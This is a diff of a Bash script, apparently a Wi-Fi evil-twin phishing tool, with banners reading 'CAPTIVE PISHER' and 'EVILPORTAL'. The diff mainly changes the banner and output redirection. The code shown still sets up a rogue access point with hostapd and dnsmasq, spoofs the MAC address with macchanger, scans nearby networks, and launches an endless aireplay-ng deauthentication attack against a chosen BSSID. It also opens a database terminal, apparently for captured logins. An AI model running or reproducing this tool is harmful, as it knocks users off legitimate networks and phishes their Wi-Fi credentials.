@@ -3,16 +3,13 @@
 tempFolder=fakeap
 
 titulo () {
-	clear
-	printf '\e[1;31m%-4s\e[m' "
-            / -.
- 	   /    -.
- 	 O/       -.
-	 |          -.
- 	 /\            -.
-	 \_\_             -.
-       ########~~~~~~~~~~~~~~ CAPTIVE PISHER by HACEFRESKO
-
+	echo "
+███████╗██╗   ██╗██╗██╗     ██████╗  ██████╗ ██████╗ ████████╗ █████╗ ██╗
+██╔════╝██║   ██║██║██║     ██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝██╔══██╗██║
+█████╗  ██║   ██║██║██║     ██████╔╝██║   ██║██████╔╝   ██║   ███████║██║
+██╔══╝  ╚██╗ ██╔╝██║██║     ██╔═══╝ ██║   ██║██╔══██╗   ██║   ██╔══██║██║
+███████╗ ╚████╔╝ ██║███████╗██║     ╚██████╔╝██║  ██║   ██║   ██║  ██║███████╗
+╚══════╝  ╚═══╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝
 "
 }
 
@@ -131,7 +128,7 @@ selectNetworkInterface2 () {
 }
 
 selectNetwork () {
-        gnome-terminal --geometry 117x50+1000+0 -e "bash -c \"airodump-ng -w $tempFolder/temporal --output-format netxml $interface; exec bash\"" -q -t "airodump-ng">/dev/null
+        gnome-terminal --geometry 117x50+1000+0 -e "bash -c \"airodump-ng -w $tempFolder/temporal --output-format netxml $interface; exec bash\"" -q -t "airodump-ng" 2>/dev/null
 
         echo "[-] Press enter to stop scanning networks"
         read stop
@@ -207,6 +204,7 @@ deauth(){
         aireplay-ng -0 0 -a "$1" "$3"
 }
 
+titulo
 selectNetworkInterface
 if [ $ok -eq 1 ]
 then
@@ -214,9 +212,9 @@ then
 ################################ PROGRAMS NEEDED ####################################
 
 	echo "[-] Updating packages..."
-	apt-get install -y hostapd apache2 dnsmasq aircrack-ng gnome-terminal>/dev/null
-	rm -r $tempFolder>/dev/null
-	mkdir $tempFolder>/dev/null
+	apt-get install -y hostapd apache2 dnsmasq aircrack-ng gnome-terminal 2>/dev/null
+	rm -r $tempFolder 2>/dev/null
+	mkdir $tempFolder 2>/dev/null
 	echo "[+] All packages updated"
 
 ######################### IPTABLES FLUSH TO AVOID CONFLICTS ##########################
@@ -236,7 +234,7 @@ then
 ################################ CHANGE MAC ADDRESS ##################################
 
 	echo "[-] Changing MAC address..."
-	macchanger -r $interface>/dev/null
+	macchanger -r $interface >/dev/null
 	ifconfig $interface up
 	echo "[+] MAC address changed"
 
@@ -267,6 +265,7 @@ then
 		echo "Security: "
         	while [ $op -lt 0 ] || [ $op -gt 2 ]
         	do
+			echo
                 	echo "[1] -> Open"
 	                echo "[2] -> WPA2"
         	        read -p "> " op
@@ -328,7 +327,7 @@ ignore_broadcast_ssid=0" > $tempFolder/hostapd.conf
 
 	        fi
 
-		gnome-terminal --geometry 117x24+0+0 -e "bash -c \"clear; hostapd $tempFolder/hostapd.conf; exec bash\"" -q -t "$essid $channel">/dev/null
+		gnome-terminal --geometry 117x24+0+0 -e "bash -c \"clear; hostapd $tempFolder/hostapd.conf; exec bash\"" -q -t "$essid $channel" 2>/dev/null
 		clear
 
 ########################## DNSMASQ CONFIG (DNS & DHCP) ###############################
@@ -377,7 +376,7 @@ ignore_broadcast_ssid=0" > $tempFolder/hostapd.conf
 
 		ifconfig $interface 10.0.0.1
 
-		gnome-terminal --geometry 117x25+0+600 -e "bash -c \"clear; dnsmasq -C $tempFolder/dnsmasq.conf -H $tempFolder/hosts -d; exec bash\"" -q -t "DHCP">/dev/null
+		gnome-terminal --geometry 117x25+0+600 -e "bash -c \"clear; dnsmasq -C $tempFolder/dnsmasq.conf -H $tempFolder/hosts -d; exec bash\"" -q -t "DHCP" 2>/dev/null
 
 ################################### WEB FILES #########################################
 
@@ -408,15 +407,15 @@ ignore_broadcast_ssid=0" > $tempFolder/hostapd.conf
 			export $bssid
 			export $channel
 	                export $interface2
-			gnome-terminal --geometry 117x25+1000+600 -e "bash -c \"deauth \"$bssid\" \"$channel\" \"$interface2\"; exec bash\"" -q -t "Deauth $essid ($bssid) channel $channel">/dev/null
+			gnome-terminal --geometry 117x25+1000+600 -e "bash -c \"deauth \"$bssid\" \"$channel\" \"$interface2\"; exec bash\"" -q -t "Deauth $essid ($bssid) channel $channel" 2>/dev/null
 			export -f titulo
-			gnome-terminal --geometry 117x25+1000+0 -e "bash -c \"titulo; mysql; exec bash\"" -q -t "Database">/dev/null
+			gnome-terminal --geometry 117x25+1000+0 -e "bash -c \"titulo; mysql; exec bash\"" -q -t "Database" 2>/dev/null
 		else
 			export -f titulo
-			gnome-terminal --geometry 117x50+1000+0 -e "bash -c \"titulo; mysql; exec bash\"" -q -t "Database">/dev/null
+			gnome-terminal --geometry 117x50+1000+0 -e "bash -c \"titulo; mysql; exec bash\"" -q -t "Database" 2>/dev/null
 	        fi
 
-		rm -r $tempFolder>/dev/null
-
+		rm -r $tempFolder 2>/dev/null
 	fi
 fi
+echo
